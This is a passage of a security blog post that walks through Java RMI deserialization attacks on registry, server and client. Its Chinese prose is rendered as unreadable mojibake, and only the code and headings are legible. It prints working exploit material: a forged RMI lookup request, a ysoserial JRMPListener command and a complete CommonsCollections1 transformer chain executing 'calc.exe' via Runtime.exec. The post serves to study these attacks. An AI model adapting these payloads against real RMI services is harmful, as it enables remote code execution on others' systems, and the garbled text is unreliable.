</code></pre><p>ç”±äº RMI å¾ˆå¤šæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ Remote ç±»å‹ï¼Œæ‰€ä»¥è¦ç”¨ Remote ç±»å‹çš„ä»£ç†å¯¹è±¡å°è£… evalObjectï¼Œå½“ä»£ç†å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼ŒevalObject ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚</p><h3 id=server-client-registry>Server/Client &ndash;> Registry</h3><p>å…ˆçœ‹çœ‹ registry ä¸­æœ€å®¹æ˜“åˆ©ç”¨çš„ä¸¤ä¸ªæ–¹æ³• bind å’Œ rebindï¼Œå®ƒä»¬ä¼šå¯¹æ¥æ”¶åˆ°çš„åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼š</p><figure><img src=/ox-hugo/2021-03-04_13-47-15_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-04_13-47-15_screenshot.png></figure><p>é€šè¿‡ Poc#getObject ç”Ÿæˆæ¶æ„å¯¹è±¡ï¼Œè°ƒç”¨ bind æ–¹æ³•(rebind ç±»åŒ)ä¼ ç»™ registryã€‚</p><pre><code class=language-java>Registry registry = LocateRegistry.getRegistry(3333);
registry.bind(&quot;User&quot;, (new Poc()).getObject());
</code></pre><p>RegistryImpl_Skel#dispatch å¤„ç†è¯·æ±‚ï¼š</p><figure><img src=/ox-hugo/2021-03-05_15-32-01_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_15-32-01_screenshot.png></figure><p>ååºåˆ—åŒ– AnnotationInvocationHandler å¯¹è±¡ï¼Œè°ƒç”¨ <code>var5.setValue()</code> æ–¹æ³•ï¼š</p><figure><img src=/ox-hugo/2021-03-05_15-42-18_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_15-42-18_screenshot.png></figure><p>è°ƒç”¨ ChainedTransformer#transformï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š</p><figure><img src=/ox-hugo/2021-03-05_15-44-54_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_15-44-54_screenshot.png></figure><figure><img src=/ox-hugo/2021-03-05_15-49-19_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_15-49-19_screenshot.png></figure><p>æ¥ä¸‹æ¥å°è¯•åˆ©ç”¨ lookup æ–¹æ³•(unbind ç±»åŒ)ï¼Œå®ƒæ¥æ”¶çš„æ˜¯ String å‚æ•°ï¼Œä¸èƒ½ç›´æ¥ä¼ é€’æ¶æ„å¯¹è±¡ã€‚</p><p>ä½†å‰é¢çš„åˆ†æè¿‡ç¨‹æˆ‘ä»¬å·²ç»çŸ¥é“ï¼ŒRegistryImpl_Skel#dispatch æ˜¯é€šè¿‡ä¸€ä¸ªæ•°å­—æ¥åˆ¤æ–­æ‰§è¡Œä»€ä¹ˆæ“ä½œçš„ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸èƒ½åˆ¤æ–­æˆ‘ä»¬ä¼ è¿‡å»çš„æ˜¯ä¸æ˜¯ String å¯¹è±¡ï¼Œé‚£æˆ‘ä»¬ä»¿ç…§ lookup æ–¹æ³•çš„é€»è¾‘æ¥å‘é€æ¶æ„å¯¹è±¡ä¸å°±å¥½äº†ã€‚</p><p>çœ‹ä¸€ä¸‹ RegistryImpl_Stub#lookup æ–¹æ³•çš„å…³é”®æ“ä½œï¼š</p><figure><img src=/ox-hugo/2021-03-05_16-07-33_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_16-07-33_screenshot.png></figure><p>é€šè¿‡ä»¥ä¸‹ä»£ç ä¼ªé€  lookup è¯·æ±‚ï¼š</p><pre><code class=language-java>Registry registry = LocateRegistry.getRegistry(3333);
// è·å–super.ref
Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
fields_0[0].setAccessible(true);
UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

// è·å–operations
Field[] fields_1 = registry.getClass().getDeclaredFields();
fields_1[0].setAccessible(true);
Operation[] operations = (Operation[]) fields_1[0].get(registry);

// æ¨¡ä»¿lookupæ–¹æ³•
RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
ObjectOutput var3 = var2.getOutputStream();
var3.writeObject(Poc.getObject());
ref.invoke(var2);
</code></pre><figure><img src=/ox-hugo/2021-03-05_16-19-31_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-05_16-19-31_screenshot.png></figure><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ RASP æŠ€æœ¯ hook è¯·æ±‚ä»£ç ï¼Œä¿®æ”¹å‘é€çš„æ•°æ®ã€‚</p><h3 id=registry-server-client>Registry &ndash;> Server/Client</h3><p>è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒåï¼Œæ˜¯é€šè¿‡ RegistryImpl_Stub å¯¹è±¡æ¥è¿›è¡Œæ“ä½œçš„ã€‚æˆ‘ä»¬å‰é¢åˆ†æè¿‡
RegistryImpl_Stub#bind æ–¹æ³•ï¼ŒåŒæ–¹ä¼šç›¸äº’ä¼ è¾“åºåˆ—åŒ–çš„æ•°æ®ï¼Œè‡ªç„¶ä¼´éšç€ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæ³¨å†Œä¸­å¿ƒä¹Ÿå°±å¯ä»¥è¿”å›æ¶æ„æ•°æ®å®Œæˆå¯¹ client æˆ– server ç«¯çš„æ”»å‡»ã€‚</p><p>å¯ä»¥ç”¨ ysoserial æ­å»ºæ¶æ„çš„ registryï¼Œæˆ‘ç”¨é«˜ç‰ˆæœ¬ jdk æ—¶ä¼šæŠ¥é”™ï¼Œç”¨ jdk8 å°±å¯ä»¥è¿è¡Œã€‚</p><pre><code class=language-bash>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12321 CommonsCollections1 'calc.exe'
</code></pre><p>åœ¨æ¶æ„ registry æ‰§è¡Œ list æ–¹æ³•åï¼Œå®¢æˆ·ç«¯çš„è°ƒç”¨æ ˆï¼š</p><figure><img src=/ox-hugo/2021-03-08_14-47-54_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_14-47-54_screenshot.png></figure><p>çœ‹åˆ° StreamRemoteCall#executeCall æ–¹æ³•ä¸­æœ‰ååºåˆ—åŒ–æ“ä½œï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><figure><img src=/ox-hugo/2021-03-08_14-50-32_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_14-50-32_screenshot.png></figure><p>å®¢æˆ·ç«¯åœ¨ switch è¯­å¥ä¸­å¯¹è¾“å…¥æµè¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¼šè¢«æ¶æ„ registry æ”»å‡»ã€‚å…¶å®åœ¨æ‰§è¡Œ bindã€unbind è¿™äº› <code>void</code> æ–¹æ³•æ—¶ï¼Œæ­£å¸¸æƒ…å†µæ˜¯èµ°åˆ° <code>case 1</code> é‡Œç›´æ¥è¿”å›çš„ï¼Œä¸è¿‡ var1
ä¹Ÿæ˜¯ä»è¾“å…¥æµè¯»å–çš„ï¼Œæ‰€ä»¥æ¶æ„ registry å®Œå…¨å¯ä»¥æ§åˆ¶ switch çš„èµ°å‘ã€‚</p><figure><img src=/ox-hugo/2021-03-08_14-55-47_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_14-55-47_screenshot.png></figure><p>å…¶ä½™çš„ lookupã€bindã€rebindã€unbind æ–¹æ³•åŒæ ·å¯ä»¥è¢«æ¶æ„ registry æ”»å‡»ã€‚</p><h3 id=server-client>Server &ndash;> Client</h3><p>å½“è¿œç¨‹æ–¹æ³•çš„è¿”å›å€¼æ˜¯å¯¹è±¡æ—¶ï¼Œserver ç«¯å¯ä»¥é€šè¿‡è¿”å›ä¸€ä¸ªæ¶æ„å¯¹è±¡å¯¹ client ç«¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚</p><p>ç°åœ¨ç»™ User æ¥å£æ·»åŠ ä¸€ä¸ª attackClient æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å› Object å¯¹è±¡ï¼š</p><details><summary>public Object attackClient() throws RemoteException</summary><p class=details><pre><code class=language-java>try {
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;,
                    new Class[] {String.class, Class[].class},
                    new Object[] {&quot;getRuntime&quot;, new Class[0]}),
            new InvokerTransformer(&quot;invoke&quot;,
                    new Class[] {Object.class, Object[].class},
                    new Object[] {null, new Object[0] }),
            new InvokerTransformer(&quot;exec&quot;,
                    new Class[] {String.class},
                    new Object[] {&quot;calc.exe&quot;})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    innerMap.put(&quot;value&quot;, &quot;zrquan&quot;);
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
    cons.setAccessible(true);
    InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
    return (Object) evalObject;
} catch (InstantiationException e) {
    e.printStackTrace();
} catch (InvocationTargetException e) {
    e.printStackTrace();
} catch (NoSuchMethodException e) {
    e.printStackTrace();
} catch (IllegalAccessException e) {
    e.printStackTrace();
} catch (ClassNotFoundException e) {
    e.printStackTrace();
}
return null;
</code></pre></p></details><p>æ³¨å†Œå¥½è¿œç¨‹å¯¹è±¡åï¼Œåœ¨ client ç«¯è°ƒç”¨ attackClient æ–¹æ³•æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure><img src=/ox-hugo/2021-03-08_22-28-16_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_22-28-16_screenshot.png></figure><p>åœ¨ UnicastRef#unmarshalValue æ–¹æ³•ä¸­è§¦å‘ååºåˆ—åŒ–ï¼ŒæˆåŠŸåœ¨ client ç«¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h3 id=client-server>Client &ndash;> Server</h3><p>ç›¸åº”çš„ï¼Œå½“è¿œç¨‹æ–¹æ³•çš„å‚æ•°æ˜¯å¯¹è±¡æ—¶ï¼Œclient ç«¯ä¹Ÿå¯ä»¥é€šè¿‡è¾“å…¥ä¸€ä¸ªæ¶æ„å¯¹è±¡å¯¹ server
ç«¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚</p><p>å†ç»™ User æ¥å£æ·»åŠ ä¸€ä¸ª attackServer æ–¹æ³•ï¼Œå®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ª Object å¯¹è±¡ï¼š</p><pre><code class=language-java>public void attackServer(Object obj) throws RemoteException {
    System.out.println(obj);
}
</code></pre><p>ä¸ºäº†æ–¹ä¾¿èµ·è§(æ‡’)ï¼Œç›´æ¥ç”¨åˆšåˆšçš„ attackClient æ¥ç”Ÿæˆæ¶æ„å¯¹è±¡ã€‚client ç«¯çš„ä»£ç å¦‚ä¸‹ï¼š</p><pre><code class=language-java>public class UserClient {
    public static void main(String[] args) throws Exception{
        Registry reigstry = LocateRegistry.getRegistry(3333);
        Object evilObj = (new UserImpl()).attackClient();
        User user = (User) reigstry.lookup(&quot;User&quot;);
        user.attackServer(evilObj);
    }
}
</code></pre><p>ä»£ç æ‰§è¡Œåï¼Œçœ‹ä¸€ä¸‹ server çº¿ç¨‹çš„è°ƒç”¨æ ˆï¼š</p><figure><img src=/ox-hugo/2021-03-08_22-41-39_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_22-41-39_screenshot.png></figure><p>UnicastServerRef#dispatch è´Ÿè´£å¤„ç† client ç«¯çš„è¯·æ±‚ï¼ŒåŒæ ·æ˜¯åœ¨
UnicastRef#unmarshalValue æ–¹æ³•ä¸­è§¦å‘ååºåˆ—åŒ–ã€‚</p><figure><img src=/ox-hugo/2021-03-08_22-45-19_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-03-08_22-45-19_screenshot.png></figure><h2 id=æœ€å>æœ€å</h2><p>æœ¬æ–‡ä»‹ç»äº† Java RMI ä¸­çš„ä¸‰ä¸ªè§’è‰²â€”â€”æ³¨å†Œä¸­å¿ƒã€æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ã€‚ç®€å•åœ°åˆ†æäº†å®ƒä»¬åœ¨è¿›è¡Œäº¤äº’æ—¶ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¼„æ¸…æ¥šååºåˆ—åŒ–ä¼šåœ¨ä»€ä¹ˆæ—¶å€™å‘ç”Ÿï¼Œä»è€Œå­¦ä¹ å¦‚ä½•å»è¿›è¡Œæ”»å‡»ã€‚</p><p>ä½†å®é™…ä¸Šï¼Œåœ¨ JDK9 ä¸­å¼•å…¥äº† JEP 290 åï¼Œå¯¹ RMI çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸å†åƒæœ¬æ–‡é‚£ä¹ˆç®€å•ç›´æ¥ã€‚å…³äº JEP 290 çš„çŸ¥è¯†ä¼šåœ¨ä¹‹åçš„æ–‡ç« ä¸­åˆ†äº«ã€‚</p></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/java-rmi/",this.page.identifier="java-rmi"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#rmi-101>RMI 101</a></li><li><a href=#ä»£ç åˆ†æ>ä»£ç åˆ†æ</a><ul><li><a href=#ç¤ºä¾‹ä»£ç >ç¤ºä¾‹ä»£ç </a></li><li><a href=#register>Register</a></li><li><a href=#server>Server</a></li><li><a href=#client>Client</a></li></ul></li><li><a href=#æ”»å‡»é€”å¾„>æ”»å‡»é€”å¾„</a><ul><li><a href=#server-client-registry>Server/Client &ndash;> Registry</a></li><li><a href=#registry-server-client>Registry &ndash;> Server/Client</a></li><li><a href=#server-client>Server &ndash;> Client</a></li><li><a href=#client-server>Client &ndash;> Server</a></li></ul></li><li><a href=#æœ€å>æœ€å</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li><li><a href=/notes target=_blank><span>Notes</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
</span><span><a href=/tags/cve/>Cve</a>
</span><span><a href=/tags/deserialize/>Deserialize</a>
</span><span><a href=/tags/emacs/>Emacs</a>
</span><span><a href=/tags/fastjson/>Fastjson</a>
</span><span><a href=/tags/java/>Java</a>
</span><span><a href=/tags/kotlin/>Kotlin</a>
</span><span><a href=/tags/org-mode/>Org-Mode</a>
</span><span><a href=/tags/web/>Web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#rmi-101>RMI 101</a></li><li><a href=#ä»£ç åˆ†æ>ä»£ç åˆ†æ</a><ul><li><a href=#ç¤ºä¾‹ä»£ç >ç¤ºä¾‹ä»£ç </a></li><li><a href=#register>Register</a></li><li><a href=#server>Server</a></li><li><a href=#client>Client</a></li></ul></li><li><a href=#æ”»å‡»é€”å¾„>æ”»å‡»é€”å¾„</a><ul><li><a href=#server-client-registry>Server/Client &ndash;> Registry</a></li><li><a href=#registry-server-client>Registry &ndash;> Server/Client</a></li><li><a href=#server-client>Server &ndash;> Client</a></li><li><a href=#client-server>Client &ndash;> Server</a></li></ul></li><li><a href=#æœ€å>æœ€å</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2024
<a href=https://zrquan.github.io/>zrquan</a>
| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
| Powered by <a href=https://github.com/andrew-aiken/hugo-theme-fuji/ target=_blank>Fuji</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script><script defer src=/assets/js/fuji.min.js></script><script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>